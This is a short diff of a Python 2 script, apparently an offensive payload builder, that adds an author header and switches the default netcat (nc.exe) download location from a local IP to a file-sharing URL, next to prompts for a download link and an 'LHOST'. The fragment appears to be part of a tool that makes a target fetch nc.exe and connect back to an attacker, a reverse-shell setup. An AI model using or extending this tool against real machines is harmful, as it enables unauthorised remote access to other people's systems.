@@ -1,3 +1,6 @@
+#Author : Daniel Victor Freire Feitosa
+#Version : 1.1.0
+#!/usr/bin/python
 import os
 
 def banner():
@@ -69,8 +72,8 @@ def run():
 		print ""
 		nc_link = raw_input("NetCat Link Download _> ")
 		if nc_link == "default":
-			#nc = "https://fs08n2.sendspace.com/dl/9140e71679f37b4c756ca6fcab9ff626/596eb3224bcb6aa7/3ajt22/nc.exe"
-			nc = "http://192.168.0.101/nc.exe"
+			nc = "https://fs08n2.sendspace.com/dl/9140e71679f37b4c756ca6fcab9ff626/596eb3224bcb6aa7/3ajt22/nc.exe"
+			#nc = "http://192.168.0.101/nc.exe"
 		else:
 			nc = nc_link
 		host = raw_input("LHOST _> ")
